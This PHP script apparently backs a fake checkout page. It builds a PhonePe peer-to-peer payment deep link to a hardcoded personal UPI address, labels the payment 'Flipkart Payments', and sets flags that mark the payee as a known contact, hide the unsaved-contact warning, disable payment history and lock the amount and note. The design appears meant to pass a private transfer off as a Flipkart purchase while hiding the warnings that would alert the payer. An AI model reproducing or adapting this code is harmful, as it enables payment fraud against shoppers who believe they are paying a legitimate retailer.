<?php
header('Content-Type: application/json');

// 1. Get the price and UPI sent from the AJAX call
$rawPrice = isset($_POST['price']) ? $_POST['price'] : 0;
$upi = isset($_POST['upi']) ? $_POST['upi'] : "paytm.s22x59n@pty"; 

// 2. CLEAN THE PRICE: Remove ₹, commas, or spaces just in case
$cleanPrice = preg_replace('/[^0-9.]/', '', $rawPrice);
$price = floatval($cleanPrice);

// 3. Calculate amount in Paise (PhonePe requirement)
$amountPaise = round($price * 100);

// 4. Build the data payload (Exact structure required by PhonePe App)
$payload = [
    "contact" => [
        "cbsName" => "",
        "nickName" => "",
        "vpa" => $upi,
        "type" => "VPA"
    ],
    "p2pPaymentCheckoutParams" => [
        "note" => "Flipkart Payments",
        "isByDefaultKnownContact" => true,
        "enableSpeechToText" => false,
        "allowAmountEdit" => false,
        "showQrCodeOption" => false,
        "disableViewHistory" => true,
        "shouldShowUnsavedContactBanner" => false,
        "isRecurring" => false,
        "checkoutType" => "DEFAULT",
        "transactionContext" => "p2p",
        "initialAmount" => (int)$amountPaise, // Must be an integer
        "disableNotesEdit" => true,
        "showKeyboard" => true,
        "currency" => "INR",
        "shouldShowMaskedNumber" => true
    ]
];

// 5. Encode to Base64
$jsonStr = json_encode($payload);
$base64Data = base64_encode($jsonStr);

// 6. Create the deep link
$deepLink = "phonepe://native?data=" . urlencode($base64Data) . "&id=p2ppayment";

// 7. Return the result to the AJAX call in payments.html
echo json_encode([
    "statusCode" => "200",
    "upi" => $upi,
    "link" => $deepLink
]);
?>